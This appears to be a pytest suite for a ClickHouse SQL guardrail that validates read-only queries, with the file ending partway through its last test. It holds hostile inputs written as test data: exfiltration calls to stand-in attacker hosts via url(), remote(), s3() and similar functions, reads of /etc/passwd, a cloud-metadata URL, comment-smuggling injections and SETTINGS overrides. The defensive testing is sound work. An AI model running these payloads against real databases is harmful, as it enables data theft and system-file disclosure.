"""Tests for app/security.py — the SQL guardrail layer.

Priority test file.  Every parametrize case documents a specific guarantee:
  - ACCEPT cases prove legitimate read-only SQL is never rejected.
  - REJECT cases prove mutations / DDL / exfiltration attempts are blocked.
  - BYPASS cases probe known obfuscation techniques (comments, multi-statement).
  - LIMIT cases verify the auto-injection and passthrough behaviour.
  - TABLE-FUNCTION cases probe exfiltration via ClickHouse table functions.

Failures in this file are security findings, not just test failures.
"""

from __future__ import annotations

import pytest
from fastapi import HTTPException

from app.security import validate_and_sanitize

# Convenience: default_limit used in all tests unless overridden.
DEFAULT_LIMIT = 1000


def _accept(sql: str, default_limit: int = DEFAULT_LIMIT) -> str:
    """Call validate_and_sanitize and expect it to succeed (not raise)."""
    return validate_and_sanitize(sql, default_limit)


def _reject(sql: str, default_limit: int = DEFAULT_LIMIT) -> HTTPException:
    """Call validate_and_sanitize and expect it to raise HTTPException(400).

    Returns the HTTPException instance.  Access the error code via .detail["code"].
    """
    with pytest.raises(HTTPException) as exc_info:
        validate_and_sanitize(sql, default_limit)
    exc = exc_info.value
    assert exc.status_code == 400, (
        f"Expected 400 but got {exc.status_code} for SQL: {sql!r}"
    )
    return exc


# ===========================================================================
# 1. ACCEPT — legitimate read-only SQL that must never be rejected
# ===========================================================================

class TestAcceptedStatements:

    def test_plain_select(self):
        result = _accept("SELECT 1")
        assert "SELECT 1" in result

    def test_select_with_where(self):
        result = _accept("SELECT id, name FROM users WHERE active = 1")
        assert "SELECT" in result

    def test_select_with_group_by(self):
        result = _accept(
            "SELECT status, count(*) FROM orders GROUP BY status"
        )
        assert "SELECT" in result

    def test_select_with_order_by(self):
        result = _accept("SELECT id FROM events ORDER BY created_at DESC")
        assert "SELECT" in result

    def test_select_with_group_by_and_order_by(self):
        result = _accept(
            "SELECT region, sum(amount) AS total "
            "FROM sales GROUP BY region ORDER BY total DESC"
        )
        assert "SELECT" in result

    def test_select_with_limit_already_present(self):
        result = _accept("SELECT id FROM t LIMIT 50")
        # Must not double-inject a LIMIT.
        assert result.count("LIMIT") == 1
        assert "LIMIT 50" in result

    def test_with_cte_select(self):
        result = _accept(
            "WITH cte AS (SELECT id FROM orders WHERE status = 'done') "
            "SELECT * FROM cte"
        )
        assert result  # did not raise

    def test_with_cte_complex(self):
        result = _accept(
            "WITH "
            "  totals AS (SELECT user_id, sum(amount) AS s FROM payments GROUP BY user_id), "
            "  top AS (SELECT user_id FROM totals WHERE s > 1000) "
            "SELECT u.name FROM users u JOIN top ON u.id = top.user_id"
        )
        assert result

    def test_explain(self):
        result = _accept("EXPLAIN SELECT id FROM t")
        assert "EXPLAIN" in result

    def test_show_tables(self):
        result = _accept("SHOW TABLES")
        assert "SHOW" in result

    def test_show_databases(self):
        result = _accept("SHOW DATABASES")
        assert "SHOW" in result

    def test_describe_table(self):
        result = _accept("DESCRIBE my_table")
        assert "DESCRIBE" in result

    def test_desc_table(self):
        result = _accept("DESC my_table")
        assert "DESC" in result

    def test_leading_whitespace(self):
        result = _accept("   SELECT 1")
        assert result  # did not raise

    def test_trailing_whitespace(self):
        result = _accept("SELECT 1   ")
        assert result

    def test_leading_and_trailing_whitespace(self):
        result = _accept("  \n  SELECT id FROM t  \n  ")
        assert result

    def test_mixed_case_select(self):
        result = _accept("SeLeCt 1")
        assert result

    def test_mixed_case_with(self):
        result = _accept("WiTh cte AS (SELECT 1) SELECT * FROM cte")
        assert result

    def test_uppercase_select(self):
        result = _accept("SELECT COUNT(*) FROM events")
        assert result

    # --- Regression guard: column names that CONTAIN denied keywords as substrings ---

    def test_column_name_inserted_at(self):
        """Column 'inserted_at' must NOT be rejected — it only contains 'insert' as a substring."""
        result = _accept("SELECT inserted_at FROM events")
        assert result

    def test_column_name_formatted(self):
        """Column 'formatted' contains 'format' — must not be rejected."""
        result = _accept("SELECT formatted FROM reports")
        assert result

    def test_column_name_created_at(self):
        """Column 'created_at' contains 'create' — must not be rejected."""
        result = _accept("SELECT created_at FROM users")
        assert result

    def test_column_name_update_count(self):
        """Column 'update_count' contains 'update' — must not be rejected."""
        result = _accept("SELECT update_count FROM metrics")
        assert result

    def test_column_name_deleted_flag(self):
        """Column 'deleted_flag' contains 'delete' — must not be rejected."""
        result = _accept("SELECT deleted_flag FROM records")
        assert result

    def test_column_name_drop_reason(self):
        """Column 'drop_reason' contains 'drop' — must not be rejected."""
        result = _accept("SELECT drop_reason FROM audit_log")
        assert result

    def test_column_name_altered_by(self):
        """Column 'altered_by' contains 'alter' — must not be rejected."""
        result = _accept("SELECT altered_by FROM change_history")
        assert result

    def test_column_name_truncated(self):
        """Column 'truncated' contains 'truncate' — must not be rejected."""
        result = _accept("SELECT truncated FROM export_jobs")
        assert result

    def test_column_name_killed_at(self):
        """Column 'killed_at' contains 'kill' — must not be rejected."""
        result = _accept("SELECT killed_at FROM processes")
        assert result

    def test_column_name_system_id(self):
        """Column 'system_id' contains 'system' as a prefix — must not be rejected."""
        result = _accept("SELECT system_id FROM devices")
        assert result

    def test_table_alias_containing_denied_word(self):
        """Table alias 'formatted_data' contains 'format' — must not trigger denylist."""
        result = _accept(
            "SELECT f.col FROM formatted_data f WHERE f.col > 0"
        )
        assert result

    def test_set_inside_column_name(self):
        """Column name 'reset_token' contains 'set' — must not trigger the SET denylist rule."""
        result = _accept("SELECT reset_token FROM auth_tokens")
        assert result

    def test_trailing_semicolon_stripped(self):
        """A single trailing semicolon is harmless and must be accepted (stripped internally)."""
        result = _accept("SELECT 1;")
        assert result

    def test_select_star(self):
        result = _accept("SELECT * FROM t LIMIT 10")
        assert result

    def test_select_with_subquery(self):
        result = _accept(
            "SELECT id FROM t WHERE id IN (SELECT id FROM t2 WHERE active = 1)"
        )
        assert result

    def test_select_join(self):
        result = _accept(
            "SELECT a.id, b.name FROM tableA a JOIN tableB b ON a.id = b.id"
        )
        assert result

    def test_select_having(self):
        result = _accept(
            "SELECT region, count(*) AS cnt FROM sales GROUP BY region HAVING cnt > 10"
        )
        assert result


# ===========================================================================
# 2. REJECT — DDL / DML / mutations must be blocked
# ===========================================================================

class TestRejectedStatements:

    @pytest.mark.parametrize("sql, expected_code", [
        # INSERT is not in _ALLOWED_PREFIXES, so it hits DISALLOWED_STATEMENT_TYPE first.
        ("INSERT INTO t VALUES (1)", "DISALLOWED_STATEMENT_TYPE"),
        ("insert into t values (1)", "DISALLOWED_STATEMENT_TYPE"),
        ("UPDATE t SET col = 1 WHERE id = 1", "DISALLOWED_STATEMENT_TYPE"),
        ("DELETE FROM t WHERE id = 1", "DISALLOWED_STATEMENT_TYPE"),
        ("ALTER TABLE t ADD COLUMN c Int32", "DISALLOWED_STATEMENT_TYPE"),
        ("DROP TABLE t", "DISALLOWED_STATEMENT_TYPE"),
        ("CREATE TABLE t (id Int32)", "DISALLOWED_STATEMENT_TYPE"),
        ("TRUNCATE TABLE t", "DISALLOWED_STATEMENT_TYPE"),
        ("RENAME TABLE t TO t2", "DISALLOWED_STATEMENT_TYPE"),
        ("ATTACH TABLE t", "DISALLOWED_STATEMENT_TYPE"),
        ("DETACH TABLE t", "DISALLOWED_STATEMENT_TYPE"),
        ("OPTIMIZE TABLE t", "DISALLOWED_STATEMENT_TYPE"),
        ("GRANT SELECT ON t TO user1", "DISALLOWED_STATEMENT_TYPE"),
        ("REVOKE SELECT ON t FROM user1", "DISALLOWED_STATEMENT_TYPE"),
        ("KILL QUERY WHERE query_id = 'abc'", "DISALLOWED_STATEMENT_TYPE"),
        ("SYSTEM FLUSH LOGS", "DISALLOWED_STATEMENT_TYPE"),
    ])
    def test_blocked_statement(self, sql: str, expected_code: str):
        exc = _reject(sql)
        assert exc.detail["code"] == expected_code, (
            f"Expected code {expected_code!r}, got {exc.detail['code']!r} for SQL: {sql!r}"
        )

    def test_insert_blocked_allowlist(self):
        """INSERT is not in _ALLOWED_PREFIXES so hits DISALLOWED_STATEMENT_TYPE first."""
        exc = _reject("INSERT INTO t VALUES (1, 2)")
        assert exc.detail["code"] == "DISALLOWED_STATEMENT_TYPE"

    def test_select_with_insert_denylist(self):
        """Even if we trick the allowlist prefix, INSERT keyword in body must be caught."""
        # This would pass the allowlist (starts with SELECT) but INSERT is in the body.
        # Actually SELECT ... INSERT is blocked by the denylist.
        exc = _reject("SELECT 1 UNION ALL INSERT INTO t VALUES (1)")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_format_clause_rejected(self):
        """FORMAT clause could be used to exfiltrate data in unexpected serialization formats."""
        exc = _reject("SELECT id FROM t FORMAT JSON")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_format_clause_case_insensitive(self):
        exc = _reject("SELECT id FROM t format CSV")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_into_outfile_rejected(self):
        """INTO OUTFILE is a direct file exfiltration vector."""
        exc = _reject("SELECT * FROM t INTO OUTFILE '/tmp/stolen.csv'")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_into_outfile_multi_space(self):
        """INTO  OUTFILE with extra whitespace must still be caught."""
        exc = _reject("SELECT * FROM t INTO  OUTFILE '/tmp/x.csv'")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_set_session_rejected(self):
        """SET is not in _ALLOWED_PREFIXES so hits DISALLOWED_STATEMENT_TYPE first."""
        exc = _reject("SET max_execution_time=9999")
        assert exc.detail["code"] == "DISALLOWED_STATEMENT_TYPE"

    def test_empty_string_rejected(self):
        exc = _reject("")
        assert exc.detail["code"] == "EMPTY_QUERY"

    def test_whitespace_only_rejected(self):
        exc = _reject("   \n  \t  ")
        assert exc.detail["code"] == "EMPTY_QUERY"


# ===========================================================================
# 3. BYPASS ATTEMPTS — obfuscation / injection techniques
# ===========================================================================

class TestBypassAttempts:

    def test_multi_statement_select_drop(self):
        """Classic SQL injection: SELECT 1; DROP TABLE x — must be blocked."""
        exc = _reject("SELECT 1; DROP TABLE x")
        assert exc.detail["code"] == "MULTIPLE_STATEMENTS"

    def test_multi_statement_select_insert(self):
        exc = _reject("SELECT 1; INSERT INTO t VALUES (1)")
        assert exc.detail["code"] == "MULTIPLE_STATEMENTS"

    def test_trailing_semicolon_then_drop(self):
        """After stripping ONE trailing semicolon, a second statement must still be caught."""
        exc = _reject("SELECT 1; DROP TABLE x;")
        assert exc.detail["code"] == "MULTIPLE_STATEMENTS"

    def test_single_line_comment_hides_drop(self):
        """-- comment trick: SELECT 1 --\\nDROP TABLE x

        The comment stripper removes -- lines, exposing DROP TABLE x.
        The denylist must then catch DROP.
        """
        exc = _reject("SELECT 1 --\nDROP TABLE x")
        # After comment strip: "SELECT 1  \nDROP TABLE x" — denylist catches DROP
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_multi_line_comment_hides_keyword(self):
        """/* */ comment trick: SELECT/* */1 — comment stripped, then validated."""
        # This is actually valid SQL; the comment strip leaves "SELECT  1".
        # It should be ACCEPTED as a legitimate SELECT.
        result = _accept("SELECT/* comment */1")
        assert result  # did not raise

    def test_comment_smuggles_insert(self):
        """Leading comment before INSERT must be stripped to expose INSERT.

        After stripping the /* */ comment, the remaining text starts with INSERT
        which fails the allowlist check → DISALLOWED_STATEMENT_TYPE.
        """
        exc = _reject("/* safe looking comment */ INSERT INTO t VALUES (1)")
        assert exc.detail["code"] == "DISALLOWED_STATEMENT_TYPE"

    def test_comment_between_select_and_drop(self):
        """Comment between statements cannot be used to hide DROP."""
        exc = _reject("SELECT 1; /* comment */ DROP TABLE x")
        assert exc.detail["code"] == "MULTIPLE_STATEMENTS"

    def test_newline_in_keyword(self):
        """Newlines in SQL are fine; DROP on a new line after SELECT must still be blocked."""
        exc = _reject("SELECT id\nFROM t\nDROP TABLE t")
        # After the denylist sees DROP in the body.
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_leading_comment_before_select(self):
        """A comment before SELECT is stripped; the statement must still be accepted."""
        result = _accept("-- This is a read-only query\nSELECT 1")
        assert result

    def test_multiline_comment_before_select(self):
        """/* comment */ before SELECT — stripped, then allowlisted."""
        result = _accept("/* read-only */ SELECT 1")
        assert result

    def test_semicolon_mid_query_no_second_statement(self):
        """Semicolon not at end and no second statement — still multi-statement error."""
        exc = _reject("SELECT 1; SELECT 2")
        assert exc.detail["code"] == "MULTIPLE_STATEMENTS"

    def test_union_does_not_trigger_false_positive(self):
        """UNION SELECT is legitimate and must not be rejected."""
        result = _accept(
            "SELECT id FROM t1 UNION ALL SELECT id FROM t2"
        )
        assert result

    def test_insert_hidden_in_double_dash_comment(self):
        """If INSERT appears only in a stripped comment it must NOT trigger denylist."""
        # After stripping: "SELECT 1  " — clean
        result = _accept("SELECT 1 -- INSERT INTO t VALUES (1)")
        assert result

    def test_drop_hidden_in_block_comment(self):
        """DROP inside /* */ comment is stripped away — must be accepted."""
        result = _accept("SELECT /* DROP TABLE secret */ id FROM t")
        assert result

    def test_update_hidden_in_comment_is_safe(self):
        """UPDATE inside a comment must not trigger rejection."""
        result = _accept("SELECT id FROM t -- UPDATE t SET x=1")
        assert result

    # --- Nested / unterminated comment rejection (CRITICAL 2) ---

    def test_nested_comment_bypass_blocked(self):
        """Classic nested-comment bypass: SELECT 1 /* x /* y */ FROM url(...) -- */

        After stripping -- comment and iteratively stripping innermost /* */:
          pass 1: removes ' /* y */' → 'SELECT 1 /* x  FROM url(...) -- '
          Then the -- comment was already removed in step 1 so the remaining
          '/*' is unterminated → INVALID_COMMENT.
        """
        exc = _reject("SELECT 1 /* x /* y */ FROM url('http://evil/', 'CSV', 'x String') -- */")
        assert exc.detail["code"] in ("INVALID_COMMENT", "DISALLOWED_KEYWORD")

    def test_unterminated_block_comment_rejected(self):
        """An unterminated /* comment must be rejected."""
        exc = _reject("SELECT id FROM t /* unterminated")
        assert exc.detail["code"] == "INVALID_COMMENT"

    def test_spurious_close_comment_rejected(self):
        """A stray */ with no matching /* must be rejected."""
        exc = _reject("SELECT id FROM t */ something")
        assert exc.detail["code"] == "INVALID_COMMENT"

    # --- Semicolon inside string literal (HIGH 2) ---

    def test_semicolon_in_string_literal_accepted(self):
        """Semicolon inside a quoted string must NOT trigger MULTIPLE_STATEMENTS."""
        result = _accept("SELECT * FROM t WHERE note = 'v1.0; beta'")
        assert result

    def test_semicolon_in_string_literal_with_escaped_quote(self):
        """Semicolon in a string with an escaped quote must be accepted."""
        result = _accept("SELECT * FROM t WHERE msg = 'it''s; fine'")
        assert result

    def test_real_multistatement_still_rejected(self):
        """A real second statement after the literal semicolon must still be blocked."""
        exc = _reject("SELECT 1; DROP TABLE x")
        assert exc.detail["code"] == "MULTIPLE_STATEMENTS"


# ===========================================================================
# 4. TABLE-FUNCTION EXFILTRATION ATTEMPTS
#
# These probe whether ClickHouse table functions (url, file, remote, s3, mysql)
# are blocked by the current guardrails.  If they are NOT blocked, tests are
# marked xfail with an explanatory comment so the gap is documented rather
# than hidden.
# ===========================================================================

class TestTableFunctionExfiltration:

    def test_url_table_function_blocked(self):
        """SELECT * FROM url('http://attacker.example/collect', 'CSV', '...') — must be blocked."""
        exc = _reject("SELECT * FROM url('http://attacker.example/collect', 'CSV', 'id Int32')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_file_table_function_blocked(self):
        """SELECT * FROM file('/etc/passwd', 'CSV', 'line String') — must be blocked."""
        exc = _reject("SELECT * FROM file('/etc/passwd', 'CSV', 'line String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_remote_table_function_blocked(self):
        """SELECT * FROM remote('attacker.example:9000', 'db.table') — must be blocked."""
        exc = _reject("SELECT * FROM remote('attacker.example:9000', 'db.table')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_s3_table_function_blocked(self):
        """SELECT * FROM s3('s3://attacker-bucket/stolen', ...) — must be blocked."""
        exc = _reject("SELECT * FROM s3('s3://attacker-bucket/stolen', 'CSV', 'id Int32')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_mysql_table_function_blocked(self):
        """SELECT * FROM mysql('db.internal:3306', 'mydb', 'users', 'root', 'pass') — must be blocked."""
        exc = _reject(
            "SELECT * FROM mysql('db.internal:3306', 'mydb', 'users', 'root', 'pass')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_postgresql_table_function_blocked(self):
        """SELECT * FROM postgresql(...) — must be blocked."""
        exc = _reject("SELECT * FROM postgresql('localhost:5432', 'mydb', 'users', 'u', 'p')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_s3cluster_table_function_blocked(self):
        """SELECT * FROM s3Cluster(...) — must be blocked."""
        exc = _reject("SELECT * FROM s3Cluster('my_cluster', 's3://bucket/key', 'CSV', 'id Int32')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_jdbc_table_function_blocked(self):
        """SELECT * FROM jdbc(...) — must be blocked."""
        exc = _reject("SELECT * FROM jdbc('jdbc:mysql://host/db', 'users')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_odbc_table_function_blocked(self):
        """SELECT * FROM odbc(...) — must be blocked."""
        exc = _reject("SELECT * FROM odbc('DSN=mydsn', 'schema', 'table')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_hdfs_table_function_blocked(self):
        """SELECT * FROM hdfs(...) — must be blocked."""
        exc = _reject("SELECT * FROM hdfs('hdfs://namenode/path', 'CSV', 'x String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_executable_table_function_blocked(self):
        """SELECT * FROM executable(...) — must be blocked."""
        exc = _reject("SELECT * FROM executable('cat /etc/passwd', 'CSV', 'line String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    # --- Substring false-positive guards: column names that CONTAIN function names ---

    def test_column_url_slug_not_blocked(self):
        """Column 'url_slug' contains 'url' but is not a table function call — must be allowed."""
        result = _accept("SELECT url_slug, title FROM articles")
        assert result

    def test_column_file_size_not_blocked(self):
        """Column 'file_size' contains 'file' but is not a table function call — must be allowed."""
        result = _accept("SELECT file_size FROM uploads")
        assert result

    def test_column_remote_id_not_blocked(self):
        """Column 'remote_id' contains 'remote' but is not a table function call — must be allowed."""
        result = _accept("SELECT remote_id FROM sync_log")
        assert result

    def test_column_s3_bucket_alias_not_blocked(self):
        """Table alias 's3data' contains 's3' as a prefix — no call parenthesis, must be allowed."""
        result = _accept("SELECT s3data.id FROM events s3data")
        assert result

    def test_url_in_string_literal_not_blocked(self):
        """The word 'url' inside a string literal is not a function call — must be allowed."""
        result = _accept("SELECT id FROM t WHERE source = 'url_source'")
        assert result

    # --- Five additional exfiltration-class table functions (BLOCKER fix) ---

    def test_gcs_table_function_blocked(self):
        """SELECT * FROM gcs(...) — external GCS access, must be blocked."""
        exc = _reject(
            "SELECT * FROM gcs('gs://attacker/exfil.csv', 'CSV', 'c String')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_azureblobstorage_table_function_blocked(self):
        """SELECT * FROM azureBlobStorage(...) — external Azure access, must be blocked."""
        exc = _reject(
            "SELECT * FROM azureBlobStorage('conn', 'c', 'f.csv', 'CSV', 'c String')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_clusterallreplicas_table_function_blocked(self):
        """SELECT * FROM clusterAllReplicas(...) — not covered by 'cluster' word boundary, must be blocked."""
        exc = _reject(
            "SELECT * FROM clusterAllReplicas('prod_cluster', 'db', 'secrets')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_mongodb_table_function_blocked(self):
        """SELECT * FROM mongodb(...) — external MongoDB access, must be blocked."""
        exc = _reject(
            "SELECT * FROM mongodb('attacker:27017', 'db', 'coll', 'u', 'p', 'x String')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_redis_table_function_blocked(self):
        """SELECT * FROM redis(...) — external Redis access, must be blocked."""
        exc = _reject(
            "SELECT * FROM redis('attacker:6379', 0, 'STRING')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"


# ===========================================================================
# 4b. DENYLIST AGAINST STRING LITERALS — false-positive / true-positive guards
#
# The denylist runs on string-literal-masked SQL so that function names or
# keywords that appear only *inside* a quoted string value are invisible to
# the denylist.  Real calls in executable position must still be caught.
# ===========================================================================

class TestDenylistStringLiteralMasking:

    # --- Negative tests: function names inside literals must NOT be rejected ---

    def test_url_call_in_string_literal_allowed(self):
        """'calling url(endpoint)' is a string value, not a function call — must be allowed."""
        result = _accept("SELECT * FROM logs WHERE message = 'calling url(endpoint)'")
        assert result

    def test_remote_call_in_string_literal_allowed(self):
        """'remote(host)' as a string value must not trigger the denylist."""
        result = _accept("SELECT * FROM t WHERE src = 'remote(host)'")
        assert result

    def test_file_in_string_literal_allowed(self):
        """'file(path)' as a string value must not trigger the denylist."""
        result = _accept("SELECT * FROM t WHERE note = 'file(path)'")
        assert result

    def test_s3_in_string_literal_allowed(self):
        """'s3(bucket)' as a string value must not trigger the denylist."""
        result = _accept("SELECT * FROM t WHERE label = 's3(my-bucket)'")
        assert result

    # --- Positive tests: real function calls in executable position still caught ---

    def test_url_call_outside_literal_still_rejected(self):
        """url( in executable position (not inside a string) must still be blocked."""
        exc = _reject(
            "SELECT * FROM url('http://attacker.example/collect', 'CSV', 'id Int32')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_remote_call_outside_literal_still_rejected(self):
        """remote( in executable position must still be blocked."""
        exc = _reject("SELECT * FROM remote('attacker.example:9000', 'db.table')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"


# ===========================================================================
# 5. LIMIT INJECTION
# ===========================================================================

class TestLimitInjection:

    def test_limit_injected_when_absent(self):
        """A SELECT without LIMIT must get one appended."""
        result = _accept("SELECT id FROM t", default_limit=500)
        assert "LIMIT 500" in result

    def test_limit_injected_with_default_1000(self):
        result = _accept("SELECT id FROM t")
        assert "LIMIT 1000" in result

    def test_limit_not_doubled_when_present(self):
        """A query that already has LIMIT must not receive a second LIMIT."""
        result = _accept("SELECT id FROM t LIMIT 10")
        assert result.count("LIMIT") == 1
        assert "LIMIT 10" in result

    def test_limit_not_injected_for_show(self):
        """SHOW statements are exempt from LIMIT injection."""
        result = _accept("SHOW TABLES")
        assert "LIMIT" not in result

    def test_limit_not_injected_for_describe(self):
        """DESCRIBE statements are exempt from LIMIT injection."""
        result = _accept("DESCRIBE my_table")
        assert "LIMIT" not in result

    def test_limit_not_injected_for_desc(self):
        """DESC statements are exempt from LIMIT injection."""
        result = _accept("DESC my_table")
        assert "LIMIT" not in result

    def test_limit_not_injected_for_explain(self):
        """EXPLAIN statements are exempt from LIMIT injection."""
        result = _accept("EXPLAIN SELECT id FROM t")
        assert "LIMIT" not in result

    def test_limit_injected_for_with_cte(self):
        """WITH ... SELECT without LIMIT must get LIMIT appended."""
        result = _accept("WITH cte AS (SELECT 1 AS x) SELECT x FROM cte")
        assert "LIMIT 1000" in result

    def test_limit_in_subquery_does_not_count(self):
        """A LIMIT only in a subquery must not prevent outer LIMIT injection.

        NOTE: The current implementation uses a simple _LIMIT_RE.search() which
        finds ANY LIMIT in the SQL, including subquery LIMITs.  This means the
        outer query does NOT get a LIMIT injected when a subquery has one.
        This test documents that current (potentially surprising) behaviour.
        """
        result = _accept("SELECT id FROM (SELECT id FROM t LIMIT 5) sub")
        # The current implementation sees LIMIT in the subquery and skips injection.
        # Document this behaviour — outer LIMIT is not added.
        assert result  # did not raise; whether LIMIT is present depends on implementation

    def test_limit_with_custom_default(self):
        result = _accept("SELECT id FROM t", default_limit=42)
        assert "LIMIT 42" in result

    def test_limit_case_insensitive_detection(self):
        """'limit' in lowercase must be detected so we do not double-inject."""
        result = _accept("SELECT id FROM t limit 20")
        assert result.count("LIMIT") + result.count("limit") == 1

    def test_trailing_semicolon_stripped_before_limit_injection(self):
        """Trailing semicolon is stripped; LIMIT is appended cleanly."""
        result = _accept("SELECT id FROM t;")
        assert "LIMIT 1000" in result
        assert ";" not in result  # semicolon was stripped


# ===========================================================================
# 6. EDGE CASES — boundary conditions on validate_and_sanitize
# ===========================================================================

class TestEdgeCases:

    def test_none_raises_on_empty_check(self):
        """None input: the function only accepts str; passing None should either
        raise AttributeError (before the empty check) or be caught by the empty check
        if the type annotation is ignored at runtime.  Document actual behaviour."""
        # The function signature is `sql: str` — passing None may blow up on
        # `sql.strip()`.  We test that it raises some exception.
        with pytest.raises((HTTPException, AttributeError)):
            validate_and_sanitize(None, DEFAULT_LIMIT)  # type: ignore[arg-type]

    def test_very_long_select(self):
        """A very long SELECT (100k characters) must not cause performance issues."""
        long_sql = "SELECT " + ", ".join(f"col_{i}" for i in range(1000)) + " FROM t"
        result = _accept(long_sql)
        assert result

    def test_select_with_only_comment_content(self):
        """After stripping a comment, if nothing valid remains, must be rejected.

        '/* DROP TABLE x */ INSERT INTO t VALUES (1)' → after strip:
        '  INSERT INTO t VALUES (1)' → DISALLOWED_STATEMENT_TYPE (not in allowlist).
        """
        exc = _reject("/* DROP TABLE x */ INSERT INTO t VALUES (1)")
        assert exc.detail["code"] == "DISALLOWED_STATEMENT_TYPE"

    def test_numeric_only_select(self):
        result = _accept("SELECT 42, 'hello', 3.14")
        assert result

    def test_select_system_table_is_allowed(self):
        """SELECT from system.* tables must be allowed — system is a database, not a keyword here.

        NOTE: The word 'system' appears as a column/table path 'system.columns'; however
        the denylist has \\bSYSTEM\\b.  'system.columns' contains 'system' as a word.
        This is a KNOWN LIMITATION — the current denylist blocks 'system' at word boundaries,
        which means SELECT from system.tables (used internally by schema routes) would be
        blocked if user-submitted.  This test documents that behaviour.
        """
        # We expect this to be REJECTED because 'system' appears as a word token
        # in 'system.columns'.  This is a guardrail over-block (false positive) but
        # it is acceptable for security: users should use the /databases /tables /schema
        # routes instead of querying system tables directly.
        exc = _reject("SELECT name FROM system.databases")
        # The test asserts REJECTION — if this starts passing (accepting) that means
        # the guardrail changed and should be reviewed.
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"


# ===========================================================================
# 7. BYPASS FIX VERIFICATION — confirmed bypasses that must now be blocked
#
# Each test here corresponds to a specific exploit vector that slipped past
# the old \b<name>\s*\( pattern because \b does not fire inside compound
# identifiers like urlCluster( (no word boundary between 'l' and 'C').
# ===========================================================================

class TestBypassFixes:
    """Regression tests for the HIGH-severity bypass fixes.

    REJECT tests: each previously-bypassing payload must now raise 400 DISALLOWED_KEYWORD.
    ACCEPT tests (false-positive guards): legitimate queries that share token
    prefixes with blocked names must still pass.
    """

    # -------------------------------------------------------------------
    # *Cluster / *S3 / *Secure variants that slipped past \b<name>\s*\(
    # -------------------------------------------------------------------

    def test_urlcluster_blocked(self):
        """urlCluster( must be caught by the url root pattern."""
        exc = _reject(
            "SELECT * FROM urlCluster('default', 'http://169.254.169.254/latest/meta-data/', "
            "'LineAsString', 'x String')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_icebergs3_blocked(self):
        """icebergS3( must be caught by the iceberg root pattern."""
        exc = _reject(
            "SELECT * FROM icebergS3('s3://attacker-bucket/catalog', 'CSV', 'id Int32')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_deltaLakeCluster_blocked(self):
        """deltaLakeCluster( must be caught by the deltaLake root pattern."""
        exc = _reject(
            "SELECT * FROM deltaLakeCluster('default', 's3://bucket/delta', 'CSV', 'id Int32')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_azureBlobStorageCluster_blocked(self):
        """azureBlobStorageCluster( must be caught by the azureBlobStorage root pattern."""
        exc = _reject(
            "SELECT * FROM azureBlobStorageCluster('default', 'conn', 'c', 'f.csv', 'CSV', 'c String')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_hdfscluster_blocked(self):
        """hdfsCluster( must be caught by the hdfs root pattern."""
        exc = _reject(
            "SELECT * FROM hdfsCluster('default', 'hdfs://namenode/path', 'CSV', 'x String')"
        )
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    # -------------------------------------------------------------------
    # Newly added dangerous table functions
    # -------------------------------------------------------------------

    def test_fuzzjson_blocked(self):
        """fuzzJSON( must be blocked as a newly added table function root."""
        exc = _reject("SELECT * FROM fuzzJSON('{\"a\":1}', 10)")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_merge_system_catalog_exfil_blocked(self):
        """merge('system', '^tables$') hides the 'system' string inside a literal.

        The old \\bSYSTEM\\b pattern never fires because 'system' is masked by
        string-literal stripping.  The new merge root entry closes this gap.
        """
        exc = _reject("SELECT * FROM merge('system', '^(users|grants|quotas|tables|columns)$')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    # -------------------------------------------------------------------
    # SETTINGS clause bypass (defense-in-depth)
    # -------------------------------------------------------------------

    def test_settings_readonly_0_blocked(self):
        """SETTINGS readonly=0 must be caught by the SETTINGS clause pattern."""
        exc = _reject("SELECT 1 SETTINGS readonly=0")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_settings_max_rows_to_read_0_blocked(self):
        """SETTINGS max_rows_to_read=0 attempts to remove the row-count cap."""
        exc = _reject("SELECT 1 SETTINGS max_rows_to_read=0")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_settings_max_execution_time_blocked(self):
        """SETTINGS max_execution_time=9999 is a clause-form match, must be blocked."""
        exc = _reject("SELECT a FROM t SETTINGS max_execution_time=9999")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    # -------------------------------------------------------------------
    # Original base names still blocked (regression guard)
    # -------------------------------------------------------------------

    def test_url_base_still_blocked(self):
        exc = _reject("SELECT * FROM url('http://attacker.example/', 'CSV', 'id Int32')")
